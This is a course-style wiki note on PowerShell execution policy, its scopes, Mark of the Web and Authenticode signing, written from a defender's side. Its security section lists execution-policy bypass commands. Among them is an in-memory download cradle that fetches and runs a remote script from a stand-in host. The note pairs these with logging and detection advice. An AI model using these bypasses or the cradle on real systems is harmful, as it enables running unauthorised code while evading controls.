# Execution Policy and Code Signing

PowerShell **execution policy** is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts, while **Authenticode code signing** lets scripts carry a verifiable digital signature from a trusted publisher. Together they govern *whether* a `.ps1` runs — but execution policy is explicitly **not** a security boundary.

## Overview

Execution policy decides whether scripts (`.ps1`), module files (`.psm1`), formatting/configuration files (`.ps1xml`), and profiles are allowed to load, and whether a signature is required. Code signing is the trust mechanism the stricter policies rely on: a script is hashed and signed with a code-signing certificate so PowerShell can verify it is unmodified and comes from a publisher the machine trusts. Enforcement of execution policy **only happens on Windows** — on Linux/macOS the policy is effectively `Bypass`.

This control pairs with the deeper lockdown and visibility features covered in [Constrained-Language-Mode-and-JEA](Constrained-Language-Mode-and-JEA.md) and [PowerShell-Logging](PowerShell-Logging.md), and it is a routine first hurdle for the tradecraft in [Offensive-PowerShell](Offensive-PowerShell.md).

> [!IMPORTANT]
> **Execution policy is not a security system**
> Microsoft states plainly that the execution policy "isn't a security system that restricts user actions." A user who cannot run a script can simply paste its contents at the prompt, pipe it to `Invoke-Expression`, or relaunch with a different policy. It prevents *accidental* execution, not a determined attacker. Real enforcement comes from [Constrained Language Mode](Constrained-Language-Mode-and-JEA.md) plus WDAC/AppLocker application control.

## Execution Policy Values

| Policy | Behavior |
|--------|----------|
| `Restricted` | Runs individual commands but **no** script files. Default on Windows **client** OS (Windows PowerShell 5.1). |
| `AllSigned` | Runs scripts, but **all** scripts and config files must be signed by a trusted publisher — including your own local scripts. |
| `RemoteSigned` | Local scripts run unsigned; scripts **downloaded from the internet** must be signed (or unblocked). Default on Windows **Server**. |
| `Unrestricted` | Runs unsigned scripts; warns before running non-local (downloaded) files. Default and unchangeable on non-Windows. |
| `Bypass` | Nothing is blocked, no warnings or prompts. Intended for apps that embed PowerShell with their own security model. |
| `Undefined` | No policy set in this scope; falls through to the next scope (effective default becomes `Restricted` on clients). |
| `Default` | Resolves to `RemoteSigned` for Windows clients and servers in current PowerShell. |

## Execution Policy Scopes

A policy can be set per scope. Scopes are evaluated in precedence order — a higher-precedence scope wins even if it is less restrictive than a lower one.

| Scope | Set by / stored in | Notes |
|-------|--------------------|-------|
| `MachinePolicy` | Group Policy (computer) | Highest precedence; overrides everything below. |
| `UserPolicy` | Group Policy (user) | |
| `Process` | `$Env:PSExecutionPolicyPreference` (in-memory) | Session-only; lost when the process closes. |
| `CurrentUser` | Per-user config file | |
| `LocalMachine` | All-users config file | Default scope for `Set-ExecutionPolicy`; requires admin. |

> [!NOTE]
> **Group Policy overrides everything**
> The **Turn on Script Execution** GPO (`Administrative Templates > Windows Components > Windows PowerShell`) sets `MachinePolicy`/`UserPolicy`, which take precedence over any local `Set-ExecutionPolicy`. Disabling the GPO is equivalent to `Restricted`. This is the enterprise-wide control point — see [Group-Policy(GPO)](../Group-Policy-Objects-GPO/Group-Policy(GPO).md).

## Managing Execution Policy

Show the effective policy and the per-scope breakdown:

```powershell
Get-ExecutionPolicy
Get-ExecutionPolicy -List
Get-ExecutionPolicy -Scope CurrentUser
```

Set a policy for a scope (LocalMachine needs an elevated session):

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Remove a policy from a scope by setting it back to `Undefined`:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope LocalMachine
```

## Mark of the Web and Zone Identifier

When Windows downloads a file (browser, email, IM), it attaches a **Zone.Identifier** alternate data stream — the "Mark of the Web" (MOTW) — tagging the file as coming from the internet zone. Under `RemoteSigned`/`AllSigned`, PowerShell refuses to run such a file unless it is signed or the mark is cleared.

Inspect and clear the mark:

```powershell
Get-Item .\script.ps1 -Stream Zone.Identifier
Unblock-File -Path .\script.ps1
```

> [!TIP]
> **Not every download gets marked**
> Files fetched with `curl.exe`, `Invoke-WebRequest`, or `Invoke-RestMethod` are **not** MOTW-tagged, so they sidestep the RemoteSigned "downloaded" check entirely. Do not treat MOTW as a reliable gate — attackers deliberately choose transfer methods that avoid it (MITRE **T1553.005 – Mark-of-the-Web Bypass**).

## Code Signing (Authenticode)

Under `AllSigned`, scripts must carry a valid Authenticode signature from a publisher in the machine's Trusted Publishers store. A signature binds a hash of the script to a code-signing certificate; a **timestamp** keeps the signature valid after the certificate expires.

Create a self-signed code-signing certificate (lab use), sign a script, and verify it:

```powershell
# Lab: generate a self-signed code-signing certificate
New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Lab Code Signing" -CertStoreLocation Cert:\CurrentUser\My

# Sign a script with a code-signing cert, adding a trusted timestamp
$cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert -TimeStampServer "http://timestamp.digicert.com"

# Verify the signature and its status
Get-AuthenticodeSignature -FilePath .\script.ps1
```

`Get-AuthenticodeSignature` returns a status such as `Valid`, `NotSigned`, `HashMismatch` (script modified after signing), or `UnknownError`. In production, use a certificate from an internal or public CA rather than a self-signed one.

## Security Considerations

> [!WARNING]
> **Trivial bypasses — log, don't rely on the policy**
> Because execution policy is not a boundary, these all defeat it without changing any setting:
> - **Relaunch with a policy flag** — `powershell.exe -ExecutionPolicy Bypass -File .\script.ps1`
> - **Inline command** — `powershell.exe -ExecutionPolicy Bypass -Command "..."`
> - **Encoded command** — `powershell.exe -EncodedCommand <base64>` (obfuscates the payload from casual inspection)
> - **Pipe to the interpreter** — `Get-Content .\script.ps1 | Invoke-Expression`
> - **Download cradle** — `IEX (New-Object Net.WebClient).DownloadString('http://host/a.ps1')` (in-memory, no file, no MOTW)
> - **Process-scope env var** — set `$env:PSExecutionPolicyPreference = "Bypass"`
>
> These map to MITRE ATT&CK **T1059.001 (Command and Scripting Interpreter: PowerShell)**. The download cradle in particular runs code that never touches disk.

The following shows why the policy is a speed bump rather than a wall — every branch below reaches execution:

```mermaid
flowchart TD
    A[Attacker wants to run a .ps1] --> B{Execution policy blocks it?}
    B -->|Restricted / AllSigned| C[Choose a bypass]
    B -->|RemoteSigned + MOTW| D[Download via curl / Invoke-WebRequest<br/>no MOTW, or Unblock-File]
    C --> E[-ExecutionPolicy Bypass]
    C --> F[Get-Content \| IEX]
    C --> G[-EncodedCommand]
    C --> H[In-memory download cradle]
    D --> Z[Script runs]
    E --> Z
    F --> Z
    G --> Z
    H --> Z
```

**Detection over prevention.** The reliable defense is *visibility*, covered in [PowerShell-Logging](PowerShell-Logging.md):
- **Script Block Logging** (Event ID **4104**) records deobfuscated script content, including `Invoke-Expression` payloads and download cradles.
- **Process creation** auditing (Event ID **4688**) with command-line capture surfaces suspicious flags like `-ExecutionPolicy Bypass`, `-EncodedCommand`, and `-w hidden`.
- Correlate with the transcription and module-logging signals rather than trusting the policy to stop anything.

## Best Practices

- Treat execution policy as **operational hygiene**, not security — enforce with [CLM](Constrained-Language-Mode-and-JEA.md) + WDAC/AppLocker for a real boundary.
- Set the policy centrally via the **Turn on Script Execution** GPO so local users cannot loosen it; prefer `AllSigned` or `RemoteSigned`.
- **Sign production scripts** with a CA-issued code-signing certificate and a timestamp server; deploy the signing CA to Trusted Publishers.
- Enable **script block logging, module logging, and transcription** ([PowerShell-Logging](PowerShell-Logging.md)) — assume bypasses will happen and make them visible.
- Alert on the classic bypass command-line patterns (`-EncodedCommand`, `Bypass`, download cradles) in your SIEM.

## Troubleshooting

| Symptom | Likely cause & fix |
|---------|--------------------|
| "running scripts is disabled on this system" | Policy is `Restricted`/`Undefined` — set an appropriate scope with `Set-ExecutionPolicy`, or sign the script. |
| Set-ExecutionPolicy "succeeded" but nothing changed | A higher-precedence scope (GPO `MachinePolicy`/`UserPolicy`, or `Process`) overrides it — check `Get-ExecutionPolicy -List`. |
| Downloaded script blocked under RemoteSigned | MOTW present — run `Unblock-File`, or sign the script. |
| `Get-AuthenticodeSignature` shows `HashMismatch` | Script edited after signing — re-sign it. |
| `AuthorizationManager check failed` on Server Core/Nano | No Windows Shell to check the zone — use `Bypass` or `AllSigned`, which skip the zone check. |

## References

- [about_Execution_Policies (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
- [about_Signing (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_signing)
- [Set-AuthenticodeSignature (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)
- [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)

## Related

- [PowerShell-Language-Fundamentals](PowerShell-Language-Fundamentals.md) — related note (cmdlets, pipeline, objects)
- [PowerShell-Modules-and-Profiles](PowerShell-Modules-and-Profiles.md) — related note (profiles are subject to execution policy)
- [PowerShell-Remoting](PowerShell-Remoting.md) — related note (remote script execution surface)
- [PowerShell-Logging](PowerShell-Logging.md) — related note (script block / module logging, the real detection layer)
- [Constrained-Language-Mode-and-JEA](Constrained-Language-Mode-and-JEA.md) — related note (the actual enforcement boundary)
- [Offensive-PowerShell](Offensive-PowerShell.md) — related note (LOLBin usage, download cradles, AMSI)
- [Group-Policy(GPO)](../Group-Policy-Objects-GPO/Group-Policy(GPO).md) — related note (Turn on Script Execution policy)
- [Windows-Event-Logs](../Windows-Operating-System-Administration/Windows-Event-Logs.md) — related note (Event IDs 4104 / 4688)
- [Enterprise Windows Infrastructure Security](../Readme.md) — course hub
